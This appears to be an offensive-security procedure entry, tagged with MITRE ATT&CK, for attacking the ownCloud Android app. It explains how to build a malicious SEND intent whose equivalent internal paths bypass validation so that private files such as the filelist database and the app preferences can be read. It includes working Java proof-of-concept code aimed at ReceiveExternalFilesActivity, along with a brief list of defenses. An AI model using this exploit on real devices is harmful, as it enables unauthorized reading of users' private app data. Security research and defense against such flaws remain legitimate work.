---
tags:
  - android
  - intent-crafting
  - bypass
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/create-malicious-send-intent-java]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Data from Local System]]'
updated_at: '2025-12-14T17:24:45.281Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 6f734062-b3bc-40af-8b75-44de172627b1
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Local System]]'
---
# Craft Malicious Intent for Internal File Access

## Summary

This procedure crafts a malicious Android intent that targets sensitive files in the ownCloud app's private directory using equivalent paths to bypass validation, granting read permissions for unauthorized access.

## Description

The intent uses android.intent.action.SEND with a file URI pointing to internal paths like /data/user/0/com.owncloud.android/databases/filelist or /data/data/./com.owncloud.android/shared_prefs/com.owncloud.android_preferences.xml. By setting Intent.FLAG_GRANT_READ_URI_PERMISSION, the receiving activity can read the file despite Android's sandboxing. This can be implemented in a PoC APK or via ADB.

## Requirements

1. Development environment for Android (e.g., Android Studio)
2. Knowledge of Android Intents and URIs
3. Target device with ownCloud installed

## Defense

Defensive measures and detection strategies:

- Validate all incoming URIs in activities to restrict to external storage
- Use android:exported="false" for sensitive activities
- Implement runtime checks for URI schemes and paths

## Objectives

1. Create an intent that resolves to private app data
2. Grant temporary read access to sensitive files
3. Prepare for sending to trigger file processing

## Instructions

### Step 1: Define the Intent in Code

**Context**: In a malicious app, build the intent targeting the ownCloud activity.

**Command** ([[commands/create-malicious-send-intent-java]]):
```java
StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();
StrictMode.setVmPolicy(builder.build());
Intent intent = new Intent("android.intent.action.SEND");
intent.setClassName("com.owncloud.android", "com.owncloud.android.ui.activity.ReceiveExternalFilesActivity");
intent.setType("*/*");
intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
intent.putExtra("android.intent.extra.STREAM", Uri.parse("file:///data/user/0/com.owncloud.android/databases/filelist"));
startActivity(intent);
```

> This code suppresses strict mode warnings, sets the target activity, and adds the malicious URI. Expected: Intent object ready for launch.

### Step 2: Test URI Resolution

**Context**: Verify the URI points to internal files.

No command; use logcat or debugger to confirm path normalization (e.g., /data/user/0/ resolves to /data/data/).

> Success if the path accesses private directories like databases or shared_prefs.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Data from Local System]] Data from Local System

### Sub-Techniques


## Commands Used

- [[commands/create-malicious-send-intent-java]]

## Tools Used


## Tags

- android
- intent-crafting
